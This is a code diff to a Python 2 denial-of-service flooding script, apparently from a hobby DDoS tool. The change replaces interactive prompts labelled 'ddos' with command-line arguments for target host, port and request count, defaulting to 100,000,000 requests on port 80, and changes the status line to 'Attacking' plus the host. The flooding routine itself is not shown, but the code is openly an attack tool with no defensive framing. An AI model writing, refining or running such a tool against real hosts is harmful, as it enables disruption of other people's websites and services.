@@ -6,21 +6,27 @@ import threading
 import time
 
 # Parse inputs
-using = '\33[91;1musing\33[00m(\33[92;1mddos\33[00m) '
-global host
-global ip
-global port
-try:
-    host = raw_input(using + 'host<( ')
-    ip = ""
-    port = input(using + 'port<( ')
-    num_requests = input(using + 'requests<( ')
-except:
-    print 'input error.'
+host = ""
+ip = ""
+port = 0
+num_requests = 0
+
+if len(sys.argv) == 2:
+    port = 80
+    num_requests = 100000000
+elif len(sys.argv) == 3:
+    port = int(sys.argv[2])
+    num_requests = 100000000
+elif len(sys.argv) == 4:
+    port = int(sys.argv[2])
+    num_requests = int(sys.argv[3])
+else:
+    print "ERROR\n Usage: " + sys.argv[0] + " < Hostname > < Port > < Number_of_Attacks >"
+    sys.exit(1)
 
 # Convert FQDN to IP
 try:
-    host = str(host).replace("https://", "").replace("http://", "").replace("www.", "")
+    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
     ip = socket.gethostbyname(host)
 except socket.gaierror:
     print " ERROR\n Make sure you entered a correct website"
@@ -37,7 +43,7 @@ def print_status():
     thread_num_mutex.acquire(True)
 
     thread_num += 1
-    print "sending packets to target =>" 
+    print "Attacking " + host
 
     thread_num_mutex.release()
 
